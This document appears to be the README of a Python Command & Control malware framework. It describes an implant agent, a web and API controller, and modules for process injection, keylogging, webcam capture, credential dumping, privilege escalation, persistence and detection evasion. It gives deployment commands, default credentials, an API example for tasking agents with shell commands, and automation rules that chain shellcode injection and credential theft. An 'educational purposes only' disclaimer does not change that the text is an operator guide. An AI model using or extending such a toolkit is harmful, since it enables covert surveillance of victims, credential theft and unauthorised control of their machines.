# Automated C2 Framework

This is an advanced Command & Control (C2) framework that provides automated post-exploitation capabilities, including process injection, keylogging, credential dumping, and more.

> **⚠️ EDUCATIONAL PURPOSES ONLY ⚠️**  
> This framework is provided for educational purposes only to understand how malware operates and how to defend against it. Use only in controlled environments and never against systems without explicit permission.

## Architecture Overview

The framework consists of three main components:

1. **C2 Server**: Manages agents, tasks, and results
2. **Agent**: The client-side implant that executes tasks on victim machines
3. **Post-Exploitation Modules**: Including process injection, keylogging, webcam capture, etc.

## Features

- **Modular Design**: Easily add new post-exploitation modules
- **Evasion Techniques**: Implements various methods to evade detection
- **Web Interface**: Manage operations through a simple web interface
- **API Endpoints**: Programmatically control the C2 server
- **Automation**: Automatically execute tasks based on target characteristics

## Prerequisites

```bash
pip install -r requirements.txt
```

## Quick Start

### Run the Complete Framework (Server + Agent)

```bash
python run_c2_framework.py
```

This will:
1. Start the C2 server on port 5001
2. Deploy a test agent that connects to the server

### Advanced Usage

```bash
# Start only the C2 server
python run_c2_framework.py --no-agent

# Deploy only an agent to a specific C2 server
python run_c2_framework.py --agent-only --server-url http://192.168.1.100:5001

# Run the server without web interface
python run_c2_framework.py --no-web

# Run on a different port
python run_c2_framework.py --port 8080
```

## Accessing the Web Interface

1. Navigate to `http://localhost:5001` (or your server IP)
2. Login with default credentials:
   - Username: `admin`
   - Password: `changeme`

## Task Execution

### Manual Tasks

1. From the web interface:
   - Go to "Create Task"
   - Select an agent
   - Choose task type and parameters
   - Submit

2. Via API:
   ```python
   import requests
   import json
   import base64

   # Create a task
   task = {
       'id': 'task_1234',
       'type': 'shell_command',
       'data': {
           'command': 'whoami'
       }
   }

   # Encode the task
   encoded_task = base64.b64encode(json.dumps(task).encode()).decode()

   # Send to C2 server
   response = requests.post(
       'http://localhost:5001/api/tasks/create',
       json={'agent_id': 'target_agent_id', 'data': encoded_task}
   )
   ```

### Automated Tasks

The framework supports automation through rules defined in the C2 server. For example:

- Automatically inject shellcode into notepad.exe on Windows 10 systems
- Automatically escalate privileges when user is not admin
- Automatically dump credentials after successful privilege escalation

## Available Modules

### Core Modules

- Process Injection (Multiple techniques)
- Keylogger
- Webcam Capture
- DNS Tunneling
- Credential Dumping
- Privilege Escalation

### Shell Operations

- Command execution
- File upload/download
- Persistence mechanisms

## Security Features

- Encrypted communication (Base64 + JSON)
- Anti-VM detection
- Jitter and randomization in beaconing
- String obfuscation
- API name obfuscation

## Advanced Integration

### Creating Custom Modules

1. Create a new module in the modules directory
2. Implement the required interface
3. Register the module in agent.py
4. Add new task type in the C2 server

### Extending the C2 Server

The server can be extended with additional endpoints, automation rules, or integration with other tools.

## Troubleshooting

### Common Issues

- **Agent can't connect**: Check firewall settings, ensure correct IP/port
- **Import errors**: Make sure all dependencies are installed
- **Permission errors**: Some modules require administrator privileges

## Logging and Monitoring

- Agent logs are stored in `agent_{id}.log`
- Server logs are in `c2_server.log`

## License

For educational and research purposes only. The authors are not responsible for any misuse or damage caused by this program. 